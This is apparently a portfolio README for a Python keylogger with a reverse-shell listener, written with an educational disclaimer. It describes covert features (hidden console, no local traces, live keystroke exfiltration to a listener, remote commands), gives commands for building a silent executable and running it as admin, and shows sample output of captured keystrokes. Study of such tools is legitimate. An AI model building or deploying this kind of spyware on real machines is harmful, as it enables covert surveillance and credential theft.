Stealthy Python Keylogger with Reverse Shell 🕵️‍♂️

Welcome to my Stealthy Python Keylogger project! 🎉 A cybersecurity tool built for educational purposes, showcasing skills from Hack The Box challenges and my Certified Penetration Testing Specialist (CPTS) certification. 
⚠️ Ethical Disclaimer: For educational use only in controlled environments (e.g., personal VMs). Unauthorized use is illegal and unethical. Use responsibly to learn cybersecurity.
Demo Video 🎥
Watch it in action: Demo Video (replace with your Google Drive link)
Features 🚀

🖥️ Silent Execution: No console window on Windows.
⌨️ System-Wide Keylogging: Captures all keystrokes (admin required).
🌐 Real-Time Logging: Instant keystroke transmission to Linux listener.
🛠️ Command Support: dir, whoami, get_logs, exit.
🕵️ No Local Logs: Zero traces on the target.
📝 Persistent Logging: Saves all data on the listener.
🔒 Packaged Executable: Password-protected keylogger.exe.

Files 📂

keylogger.py: Windows keylogger script.
listener.py: Linux listener script.
dist/keylogger.zip: Password-protected executable (contact for password).
keylogger_icon.png: Project icon.
.gitignore: Excludes build artifacts.

Installation 🔧
Windows VM
pip install keyboard pyinstaller

Linux VM
sudo apt install python3

Update LISTENER_IP in keylogger.py to your Linux VM IP (e.g., 192.168.65.130).
Packaging 📦
pyinstaller --onefile --noconsole keylogger.py

Output in dist/keylogger.zip (contact for password).
Usage 📚

Start listener:python3 listener.py


Run keylogger (admin):Start-Process .\dist\keylogger.exe -Verb runAs


Type in any app; logs appear on listener.
Send commands: whoami, dir, get_logs, exit.

Example Output 📈
Listener Console:
Listening on 0.0.0.0:4444...
Connection from ('192.168.65.133', 50499)
[*] Connected from Windows
KEYSTROKE: [2025-08-07 08:00:23] w
KEYSTROKE: [2025-08-07 08:00:24] h
KEYSTROKE: [2025-08-07 08:00:24] o
> dir
Sent command: dir
Volume in drive C has no label...
> whoami
Sent command: whoami
desktop-3ckfkt3\ajnur
> get_logs
Sent command: get_logs
[*] Logs:
LOG: [2025-08-07 08:00:23] w
LOG: [2025-08-07 08:00:24] h
LOG: [2025-08-07 08:00:24] o
> exit
Sent command: exit
Connection closed

Notes 📝

Admin Required: For Windows keylogging.
Dependencies: keyboard bundled in keylogger.exe.
Portfolio: Showcases networking and system programming skills.

Connect 🤝

LinkedIn: Ajnur Radovic
Email: ajnurradovic1@gmail.com

License 📜
MIT License
